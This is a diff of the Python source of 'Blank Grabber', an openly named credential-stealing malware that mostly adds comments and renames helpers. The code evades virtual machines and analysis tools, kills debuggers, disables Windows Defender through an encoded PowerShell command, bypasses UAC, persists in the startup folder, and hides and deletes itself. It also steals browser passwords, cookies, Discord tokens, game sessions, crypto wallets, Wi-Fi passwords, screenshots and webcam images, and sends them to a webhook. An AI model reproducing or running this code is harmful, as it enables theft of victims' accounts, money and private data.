@@ -22,7 +22,11 @@ from urllib3 import PoolManager, HTTPResponse
 from DPAPI import CryptUnprotectData
 import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
 
+if not hasattr(sys, "_MEIPASS"):
+    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Sets _MEIPASS if does not exist (py mode)
+
 class Settings:
+
     Webhook = "%webhook%"
     PingMe = bool("%pingme%")
     Vmprotect = bool("%vmprotect%")
@@ -46,46 +50,47 @@ class Settings:
     DiscordInjection = bool("%discordinjection%")
 
 class VmProtect:
+
     BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
     BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
     BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
     BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
 
     @staticmethod
-    def checkUUID() -> bool:
+    def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
         uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
         return uuid in VmProtect.BLACKLISTED_UUIDS
 
     @staticmethod
-    def checkComputerName() -> bool:
+    def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
         computername = os.getenv("computername")
         return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
 
     @staticmethod
-    def checkUsers() -> bool:
+    def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
         user = os.getlogin()
         return user.lower() in VmProtect.BLACKLISTED_USERS
 
     @staticmethod
-    def checkHosting() -> bool:
-        http = PoolManager()
+    def checkHosting() -> bool: # Checks if the user's system in running on a server or not
+        http = PoolManager(timeout= 10.0)
         try:
             return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
         except Exception:
             return False
 
     @staticmethod
-    def checkHTTPSimulation() -> bool:
-        http = PoolManager()
+    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
+        http = PoolManager(timeout= 1.0)
         try:
-            http.request('GET', f'https://blank{Utility.GetRandomName()}.in')
+            http.request('GET', f'https://blank{Utility.GetRandomString()}.in')
         except Exception:
             return False
         else:
             return True
 
     @staticmethod
-    def checkRegistry() -> bool:
+    def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
         gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
@@ -93,25 +98,29 @@ class VmProtect:
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
 
     @staticmethod
-    def killTasks() -> None:
+    def killTasks() -> None: # Kills blacklisted processes
         out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
         for i in out:
             i = i.split("\r\n")[:2]
-            name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
-            if not name in VmProtect.BLACKLISTED_TASKS:
-                continue
-            subprocess.run(f'taskkill /F /PID {pid}', shell= True, capture_output= True)
+            try:
+                name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
+                if not name in VmProtect.BLACKLISTED_TASKS:
+                    continue
+                subprocess.Popen('taskkill /F /PID %d' % pid, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            except Exception:
+                pass
 
     @staticmethod
-    def isVM() -> bool:
+    def isVM() -> bool: # Checks if the user is running on a VM or not
         Thread(target= VmProtect.killTasks, daemon= True).start()
-        return VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry() #or vmprotect.checkHTTPSimulation()
+        return VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry() or VmProtect.checkHTTPSimulation()
 
 class Errors:
+
     errors: list[str] = []
 
     @staticmethod 
-    def Catch(func):
+    def Catch(func): # Decorator to catch exceptions and store them in the `errors` list
         def newFunc(*args, **kwargs):
             try:
                 return func(*args, **kwargs)
@@ -119,52 +128,53 @@ class Errors:
                 if not isinstance(e, UnicodeEncodeError):
                     trb = traceback.format_exc()
                     Errors.errors.append(trb)
-                    if hasattr(sys, "frozen"):
+                    if Utility.GetSelf()[1]: # If exe mode, then print the traceback
                         print(trb)
         
         return newFunc
 
 class Tasks:
+
     threads: list[Thread] = list()
 
     @staticmethod
-    def AddTask(task: Thread) -> None:
+    def AddTask(task: Thread) -> None: # Add new thread to the list
         Tasks.threads.append(task)
     
     @staticmethod
-    def WaitForAll() -> None:
+    def WaitForAll() -> None: # Wait for all threads to finish
         for thread in Tasks.threads:
             thread.join()
 
 class Utility:
 
     @staticmethod
-    def GetSelf() -> tuple[str, bool]:
+    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
         if hasattr(sys, "frozen"):
             return (sys.executable, True)
         else:
             return (__file__, False)
 
     @staticmethod
-    def DisableDefender() -> None:
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
+    def DisableDefender() -> None: # Tries to disable the defender
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() # Encoded because it triggers antivirus and it can delete the file
         subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
-    def ExcludeFromDefender(path: str = None) -> None:
+    def ExcludeFromDefender(path: str = None) -> None: # Tries to exclude a file or folder from defender's scan
         if path is None:
             path = Utility.GetSelf()[0]
         subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
-    def GetRandomName(length: int = 5, invisible: bool = False):
+    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
         if invisible:
             return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
         else:
             return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
     
     @staticmethod
-    def GetWifiPasswords() -> dict:
+    def GetWifiPasswords() -> dict: # Gets wifi passwords stored in the system
         profiles = list()
         passwords = dict()
 
@@ -185,7 +195,7 @@ class Utility:
         return passwords
     
     @staticmethod
-    def Tree(path: str | tuple, prefix: str = ""):
+    def Tree(path: str | tuple, prefix: str = ""): # Generates a tree for the given path
         def GetSize(_path: str) -> int:
             size = 0
             if os.path.isfile(_path):
@@ -230,71 +240,70 @@ class Utility:
             count += 1
     
     @staticmethod
-    def IsAdmin() -> bool:
+    def IsAdmin() -> bool: # Checks if the program has administrator permissions or not
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
     
     @staticmethod
-    def UACbypass(method: int = 1) -> None:
-        if not hasattr(sys, "frozen"):
-            return
+    def UACbypass(method: int = 1) -> None: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
+        if Utility.GetSelf()[1]:
         
-        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
+            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
         
-        if method == 1:
-            if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
-            if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
-            execute("computerdefaults --nouacbypass")
-            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            if method == 1:
+                if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
+                if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
+                execute("computerdefaults --nouacbypass")
+                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
 
-        elif method == 2:
+            elif method == 2:
 
-            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
-            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            execute("fodhelper --nouacbypass")
-            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                execute("fodhelper --nouacbypass")
+                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
         
-        os._exit(0)
+            os._exit(0)
     
     @staticmethod
-    def IsInStartup() -> bool:
+    def IsInStartup() -> bool: # Checks if the file is in startup
         path = os.path.dirname(Utility.GetSelf()[0])
         return os.path.basename(path).lower() == "startup"
     
     @staticmethod
-    def PutInStartup() -> str:
+    def PutInStartup() -> str: # Puts the file in startup (exe mode)
         STARTUPDIR = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
         file, isExecutable = Utility.GetSelf()
         if isExecutable:
-            out = os.path.join(STARTUPDIR, "{}.scr".format(Utility.GetRandomName(invisible= True)))
+            out = os.path.join(STARTUPDIR, "{}.scr".format(Utility.GetRandomString(invisible= True)))
             os.makedirs(STARTUPDIR, exist_ok= True)
             try: shutil.copy(file, out) 
             except Exception: return None
             return out
     
     @staticmethod
-    def IsConnectedToInternet() -> bool:
-        http = PoolManager()
+    def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
+        http = PoolManager(timeout= 10.0)
         try:
             return http.request("GET", "https://gstatic.com/generate_204").status == 204
         except Exception:
             return False
     
     @staticmethod
-    def DeleteSelf():
-        path, frozen = Utility.GetSelf()
-        if frozen:
+    def DeleteSelf(): # Deletes the current file
+        path, isExecutable = Utility.GetSelf()
+        if isExecutable:
             subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
             os._exit(0)
         else:
             os.remove(path)
     
     @staticmethod
-    def HideSelf() -> None:
+    def HideSelf() -> None: # Hides the current file
         path, _ = Utility.GetSelf()
         subprocess.Popen('attrib +h +s "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
     @staticmethod
-    def BlockSites() -> None:
+    def BlockSites() -> None: # Tries to block AV related sites using hosts file
         if not Utility.IsAdmin() or not Settings.BlockAvSites:
             return
         call = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell= True, capture_output= True)
@@ -328,16 +337,16 @@ class Browsers:
 
     class Chromium:
 
-        BrowserPath: str = None
-        EncryptionKey: bytes = None
+        BrowserPath: str = None # Stores the path to the browser's storage directory
+        EncryptionKey: bytes = None # Stores the encryption key that the browser uses to encrypt the data
 
         def __init__(self, browserPath: str) -> None:
-            if not os.path.isdir(browserPath):
+            if not os.path.isdir(browserPath): # Checks if the browser's storage directory exists
                 raise NotADirectoryError("Browser path not found!")
 
             self.BrowserPath = browserPath
         
-        def GetEncryptionKey(self) -> bytes | None:
+        def GetEncryptionKey(self) -> bytes | None: # Gets the encryption key
             if self.EncryptionKey is not None:
                 return self.EncryptionKey
             
@@ -356,7 +365,7 @@ class Browsers:
                 else:
                     return None
         
-        def Decrypt(self, buffer: bytes, key: bytes) -> str:
+        def Decrypt(self, buffer: bytes, key: bytes) -> str: # Decrypts the data using the encryption key
 
             version = buffer.decode(errors= "ignore")
             if (version.startswith(("v10", "v11"))):
@@ -367,7 +376,7 @@ class Browsers:
             else:
                 return str(CryptUnprotectData(buffer))
         
-        def GetPasswords(self) -> list[tuple[str, str, str]]:
+        def GetPasswords(self) -> list[tuple[str, str, str]]: # Gets all passwords from the browser
             encryptionKey = self.GetEncryptionKey()
             passwords = list()
 
@@ -384,7 +393,7 @@ class Browsers:
             
             for path in loginFilePaths:
                 while True:
-                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomName(10) + ".tmp")
+                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                     if not os.path.isfile(tempfile):
                         break
                 
@@ -410,7 +419,7 @@ class Browsers:
             
             return passwords
         
-        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
+        def GetCookies(self) -> list[tuple[str, str, str, str, int]]: # Gets all cookies from the browser
             encryptionKey = self.GetEncryptionKey()
             cookies = list()
 
@@ -427,7 +436,7 @@ class Browsers:
             
             for path in cookiesFilePaths:
                 while True:
-                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomName(10) + ".tmp")
+                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                     if not os.path.isfile(tempfile):
                         break
                 
@@ -453,7 +462,7 @@ class Browsers:
             
             return cookies
         
-        def GetHistory(self) -> list[tuple[str, str, int]]:
+        def GetHistory(self) -> list[tuple[str, str, int]]: # Gets all browsing history of the browser
             history = list()
 
             historyFilePaths = list()
@@ -466,7 +475,7 @@ class Browsers:
             
             for path in historyFilePaths:
                 while True:
-                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomName(10) + ".tmp")
+                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                     if not os.path.isfile(tempfile):
                         break
                 
@@ -491,14 +500,15 @@ class Browsers:
             return list([(x[0], x[1], x[2]) for x in history])
 
 class Discord:
-    httpClient = PoolManager() # Client for http requests
-    ROAMING = os.getenv("appdata")
-    LOCALAPPDATA = os.getenv("localappdata")
-    REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
-    REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
+
+    httpClient = PoolManager(timeout= 10.0) # Client for http requests
+    ROAMING = os.getenv("appdata") # Roaming directory
+    LOCALAPPDATA = os.getenv("localappdata") # Local application data directory
+    REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}" # Regular expression for matching tokens
+    REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*" # Regular expression for matching encrypted tokens in Discord clients
 
     @staticmethod
-    def GetHeaders(token: str = None) -> dict:
+    def GetHeaders(token: str = None) -> dict: # Returns headers for making requests
         headers = {
         "content-type" : "application/json",
         "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
@@ -510,7 +520,7 @@ class Discord:
         return headers
     
     @staticmethod
-    def GetTokens() -> list[dict]:
+    def GetTokens() -> list[dict]: # Gets tokens from Discord clients and browsers
         results: list[dict] = list()
         tokens: list[str] = list()
         threads: list[Thread] = list()
@@ -634,7 +644,7 @@ class Discord:
         return results
 
     @staticmethod
-    def SafeStorageSteal(path: str) -> list[str]:
+    def SafeStorageSteal(path: str) -> list[str]: # Searches for tokens in the Discord client's storage directory
         encryptedTokens = list()
         tokens = list()
         key: str = None
@@ -681,7 +691,7 @@ class Discord:
         return tokens
     
     @staticmethod
-    def SimpleSteal(path: str) -> list[str]:
+    def SimpleSteal(path: str) -> list[str]: # Searches for tokens in browser's storage directory
         tokens = list()
         levelDbPaths = list()
 
@@ -708,7 +718,7 @@ class Discord:
         return tokens
     
     @staticmethod
-    def FireFoxSteal(path: str) -> list[str]:
+    def FireFoxSteal(path: str) -> list[str]: # Searches for tokens in Firefox browser's storage directory
         tokens = list()
 
         for root, _, files in os.walk(path):
@@ -729,7 +739,7 @@ class Discord:
         return tokens
     
     @staticmethod
-    def InjectJs() -> str | None:
+    def InjectJs() -> str | None: # Injects javascript into the Discord client's file
         check = False
         try:
             code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.Webhook.encode()).decode()))
@@ -756,33 +766,33 @@ class Discord:
 
 class BlankGrabber:
 
-    Separator: str = None
-    TempFolder: str = None
-    ArchivePath: str = None
+    Separator: str = None # Separator for separating different entries in plaintext files
+    TempFolder: str = None # Temporary folder for storing data while collecting
+    ArchivePath: str = None # Path of the archive to be made after all the data is collected
 
-    Cookies: list = []
-    Passwords: list = []
-    History: list = []
-    RobloxCookies: list = []
-    DiscordTokens: list = []
-    WifiPasswords: list = []
-    Screenshot: int = 0
-    MinecraftSessions: int = 0
-    WebcamPictures: int = 0
-    TelegramSessions: int = 0
-    WalletsCount: int = 0
-    SteamCount: int = 0
+    Cookies: list = [] # List of cookies collected
+    Passwords: list = [] # List of passwords collected
+    History: list = [] # List of history collected
+    RobloxCookies: list = [] # List of Roblox cookies collected
+    DiscordTokens: list = [] # List of Discord tokens collected
+    WifiPasswords: list = [] # List of WiFi passwords collected
+    Screenshot: int = 0 # Number of screenshots taken
+    MinecraftSessions: int = 0 # Number of Minecraft session files collected
+    WebcamPictures: int = 0 # Number of webcam snapshots collected
+    TelegramSessions: int = 0 # Number of Telegram sessions collected
+    WalletsCount: int = 0 # Number of different crypto wallets collected
+    SteamCount: int = 0 # Number of steam accounts collected
 
-    def __init__(self) -> None:
-        self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n"
+    def __init__(self) -> None: # Constructor to call all the functions
+        self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
         
         while True:
-            self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomName() + ".zip")
+            self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomString() + ".zip") # Sets the archive path
             if not os.path.isfile(self.ArchivePath):
                 break
 
         while True:
-            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomName(10, True))
+            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
             if not os.path.isdir(self.TempFolder):
                 os.makedirs(self.TempFolder, exist_ok= True)
                 break
@@ -806,22 +816,22 @@ class BlankGrabber:
         ):
             thread = Thread(target= func, daemon= daemon)
             thread.start()
-            Tasks.AddTask(thread)
+            Tasks.AddTask(thread) # Adds all the threads to the task queue
         
-        Tasks.WaitForAll()
-        if Errors.errors:
+        Tasks.WaitForAll() # Wait for all the tasks to complete
+        if Errors.errors: # If there were any errors during the process, then save the error messages into a file
             with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
-        self.GenerateTree()
-        self.SendData()
+        self.GenerateTree() # Generate a tree of all the collected files in the temporary folder
+        self.SendData() # Send all the data to the webhook
         try:
-            os.remove(self.ArchivePath)
-            shutil.rmtree(self.TempFolder)
+            os.remove(self.ArchivePath) # Remove the archive from the system
+            shutil.rmtree(self.TempFolder) # Remove the temporary folder from the system
         except Exception:
             pass
 
     @Errors.Catch
-    def StealMinecraft(self) -> None:
+    def StealMinecraft(self) -> None: # Steals Minecraft session files
         if Settings.CaptureGames:
             saveToPath = os.path.join(self.TempFolder, "Games", "Minecraft")
             userProfile = os.getenv("userprofile")
@@ -850,7 +860,7 @@ class BlankGrabber:
                     self.MinecraftSessions += 1
     
     @Errors.Catch
-    def StealSteam(self) -> None:
+    def StealSteam(self) -> None: # Steals Steam accounts
         if Settings.CaptureGames:
             saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
             steamPath = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
@@ -865,7 +875,7 @@ class BlankGrabber:
                         self.SteamCount += 1
     
     @Errors.Catch
-    def StealRobloxCookies(self) -> None:
+    def StealRobloxCookies(self) -> None: # Steals Roblox cookies
         saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
         note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
 
@@ -890,7 +900,7 @@ class BlankGrabber:
                 file.write("{}{}{}".format(note, self.Separator, self.Separator.join(self.RobloxCookies)))
     
     @Errors.Catch
-    def StealWallets(self) -> None:
+    def StealWallets(self) -> None: # Steals crypto wallets
         if Settings.CaptureWallets:
             saveToDir = os.path.join(self.TempFolder, "Wallets")
 
@@ -962,7 +972,7 @@ class BlankGrabber:
                                                 except Exception: pass
     
     @Errors.Catch
-    def StealSystemInfo(self) -> None:
+    def StealSystemInfo(self) -> None: # Steals system information
         if Settings.CaptureSystemInfo:
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -974,7 +984,7 @@ class BlankGrabber:
                     file.write(output)
         
     @Errors.Catch
-    def GetDirectoryTree(self) -> None:
+    def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
 
         PIPE      = chr(9474) + "   "
         TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
@@ -1000,7 +1010,7 @@ class BlankGrabber:
                     file.write(value)
     
     @Errors.Catch
-    def GetClipboard(self) -> None:
+    def GetClipboard(self) -> None: # Copies text from the clipboard
         if Settings.CaptureSystemInfo:
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1013,7 +1023,7 @@ class BlankGrabber:
                         file.write(content)
     
     @Errors.Catch
-    def GetAntivirus(self) -> None:
+    def GetAntivirus(self) -> None: # Finds what antivirus(es) are installed in the system
         if Settings.CaptureSystemInfo:
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1027,7 +1037,7 @@ class BlankGrabber:
                         file.write("\n".join(output))
     
     @Errors.Catch
-    def GetTaskList(self) -> None:
+    def GetTaskList(self) -> None: # Gets list of processes currently running in the system
         if Settings.CaptureSystemInfo:
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1039,7 +1049,7 @@ class BlankGrabber:
                     tasklist.write(output)
     
     @Errors.Catch
-    def GetWifiPasswords(self) -> None:
+    def GetWifiPasswords(self) -> None: # Saves WiFi passwords stored in the system
         if Settings.CaptureWifiPasswords:
             saveToDir = os.path.join(self.TempFolder, "System")
             passwords = Utility.GetWifiPasswords()
@@ -1053,7 +1063,7 @@ class BlankGrabber:
                 self.WifiPasswords.extend(profiles)
     
     @Errors.Catch
-    def TakeScreenshot(self) -> None:
+    def TakeScreenshot(self) -> None: # Takes screenshot(s) of all the monitors of the system
         if Settings.CaptureScreenshot:
             image = ImageGrab.grab(bbox=None,
                 include_layered_windows=False,
@@ -1063,17 +1073,15 @@ class BlankGrabber:
             image.save(os.path.join(self.TempFolder, "Screenshot.png"), "png")
             self.Screenshot += 1
 
-
-    
     @Errors.Catch
-    def BlockSites(self) -> None:
+    def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
         if Settings.BlockAvSites:
             Utility.BlockSites()
             for process in ("chrome", "firefox", "msedge", "safari", "opera", "iexplore"):
                 subprocess.Popen("taskkill /F /IM {}.exe".format(process), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @Errors.Catch
-    def StealBrowserData(self) -> None:
+    def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
         threads: list[Thread] = []
         paths = {
             "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
@@ -1138,10 +1146,9 @@ class BlankGrabber:
             self.StealRobloxCookies()
 
     @Errors.Catch
-    def Webshot(self) -> None:
+    def Webshot(self) -> None: # Captures snapshot(s) from the webcam(s)
         isExecutable = Utility.GetSelf()[1]
-        MEIPASS = getattr(sys, "_MEIPASS") if isExecutable else os.path.dirname(__file__)
-        if not Settings.CaptureWebcam or not os.path.isfile(Camfile := os.path.join(MEIPASS, 'Camera')):
+        if not Settings.CaptureWebcam or not os.path.isfile(Camfile := os.path.join(sys._MEIPASS, 'Camera')):
             return
         
         def isMonochrome(path: str):
@@ -1153,7 +1160,7 @@ class BlankGrabber:
         if not b'This program cannot be run in DOS mode.' in data:
             return
         if isExecutable:
-            tempCam = os.path.join(MEIPASS, 'Camera.exe')
+            tempCam = os.path.join(sys._MEIPASS, 'Camera.exe')
         else:
